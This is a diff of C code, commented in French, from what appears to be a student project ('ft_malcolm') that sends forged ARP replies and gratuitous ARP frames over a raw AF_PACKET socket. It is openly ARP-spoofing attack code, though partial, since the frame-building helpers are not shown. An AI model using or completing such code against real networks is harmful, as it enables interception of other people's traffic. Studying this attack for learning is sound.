@@ -20,19 +20,28 @@
 //  unsigned char sll_addr[8] (Tableau contenant l'adresse mac. La taille du tableau est sll_halen)
 //}
 
+//Pour recuperer toutes les communications qui arrive sur notre machine on utilise des RAW Sockets qui vont permettre de manipuler/composer
+//soi-meme la partie IP du modele OSI. Avec des sockets normal on peut aussi agir sur cette partie mais pas autant on sera plutot sur la partie 4 du modele OSI.
+//On va pouvoir aussi avec ce genre de socket recuperer les requetes broadcast et multicast.
+//Je met sockRaw en variable globale pour pouvoir quand je recois un signal CTRL + V quitter proprement le programme
+
+int sockRaw = 0;
+
+void sig(int sig)
+{
+    printf("Catch signal %d : CTRL + C stop ft_malcolm\n", sig);
+    close(sockRaw);
+    sockRaw = -1;
+}
+
 int main(int argc, char **argv)
 {
+    signal(SIGINT, sig);
     struct network_frame network_frame_info;
-    if (!parse_arg(argv, argc, &network_frame_info.arg_addr))
+    if (!parse_arg(argv, argc, &network_frame_info.arg_addr, &network_frame_info.network_interface))
         return (1);
     char buf[SIZE_MAX_ARP];
     socklen_t len = sizeof(network_frame_info.network_interface);
-
-    //Pour recuperer toutes les communications qui arrive sur notre machine on utilise des RAW Sockets qui vont permettre de manipuler/composer
-    //soi-meme la partie IP du modele OSI. Avec des sockets normal on peut aussi agir sur cette partie mais pas autant on sera plutot sur la partie 4 du modele OSI.
-    //On va pouvoir aussi avec ce genre de socket recuperer les requetes broadcast et multicast.
-
-    int sockRaw;
 
     //Pour creer une RAW socket on donne a socket comme type (2eme arg) SOCK_RAW. Comme domaine (1er arg) AF_PACKET qui va permettre d'accerder au donnes brut
     //incluant les entetes ethernet (couche 2 modele OSI) et IP (couche 3 modele OSI). Ensuite on renseigne le protocol ce sera le type de trame que l'on veut
@@ -44,28 +53,37 @@ int main(int argc, char **argv)
     sockRaw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     if (sockRaw < 0)
         return(printf("socket failed : %s\n", strerror(errno)), 1);
-
-    while(1)
-    {
-        memset(buf, 0, SIZE_MAX_ARP);
-        memset(&network_frame_info.network_interface, 0, sizeof(struct sockaddr_ll));
-        memset(&network_frame_info.recv_frame, 0, sizeof(struct arp_frame));
-        memset(&network_frame_info.send_frame, 0, sizeof(struct arp_frame));
-
-        size_t recv = recv_frame(sockRaw, buf, &network_frame_info, &len);
-        if (recv <= 0)
-            return (1);
-
-        if (memcmp(network_frame_info.recv_frame.sender_mac, network_frame_info.arg_addr.arg_mac_addr_src, ETH_ALEN) == 0 && memcmp(network_frame_info.recv_frame.sender_ip, network_frame_info.arg_addr.arg_ip_addr_src, 4) == 0 && (memcmp(network_frame_info.recv_frame.target_mac, network_frame_info.arg_addr.arg_mac_addr_target, ETH_ALEN) == 0 || memcmp(network_frame_info.recv_frame.target_mac, "\0\0\0\0\00\0\0", ETH_ALEN) == 0) && memcmp(network_frame_info.recv_frame.target_ip, network_frame_info.arg_addr.arg_ip_addr_target, 4) == 0)
+    while(sockRaw != -1)
+    {        
+        if (network_frame_info.arg_addr.unicast == 1)//Attend qu'une source veuille communiquer avec une cible, marche en one shot
         {
-            /*Creation de la trame arp retour falsifie*/
+            ssize_t recv = recv_frame(&sockRaw, buf, &network_frame_info, &len);
+            if (recv <= 0)
+                return (1);
 
-            create_frame_unicast_request(&network_frame_info.send_frame, &network_frame_info.recv_frame);
+            if (memcmp(network_frame_info.recv_frame.sender_mac, network_frame_info.arg_addr.arg_mac_addr_src, ETH_ALEN) == 0 && memcmp(network_frame_info.recv_frame.sender_ip, network_frame_info.arg_addr.arg_ip_addr_src, 4) == 0 && (memcmp(network_frame_info.recv_frame.target_mac, network_frame_info.arg_addr.arg_mac_addr_target, ETH_ALEN) == 0 || memcmp(network_frame_info.recv_frame.target_mac, "\0\0\0\0\00\0\0", ETH_ALEN) == 0) && memcmp(network_frame_info.recv_frame.target_ip, network_frame_info.arg_addr.arg_ip_addr_target, 4) == 0)
+            {
+                /*Creation de la trame arp retour falsifie*/
 
+                create_frame_unicast_request(&network_frame_info.send_frame, &network_frame_info.recv_frame);//COntrole code
+                if (send_frame(sockRaw, &network_frame_info) == -1)
+                    printf("Send fail %s\n", strerror(errno));
+                memset(&network_frame_info.network_interface, 0, sizeof(struct sockaddr_ll));
+                print_information(buf, &network_frame_info, recv);
+            }
+        }
+        else if (network_frame_info.arg_addr.gratuitous == 1) //Ne fonctionne pas si pas l'adresse ip n'est pas deja rentre sur les machines, marche en one shot
+        {
+            create_frame_gatuitous(&network_frame_info.send_frame, argv[2]); //controle code
+            print_network_interface(&network_frame_info.network_interface);
             if (send_frame(sockRaw, &network_frame_info) == -1)
                 printf("Send fail %s\n", strerror(errno));
+            printf("Send\n");
+            fflush(stdout);
         }
-        print_information(buf, &network_frame_info, recv);
+        memset(buf, 0, SIZE_MAX_ARP);
+        memset(&network_frame_info.recv_frame, 0, sizeof(struct arp_frame));
+        memset(&network_frame_info.send_frame, 0, sizeof(struct arp_frame));
     }
     return(0);
 }
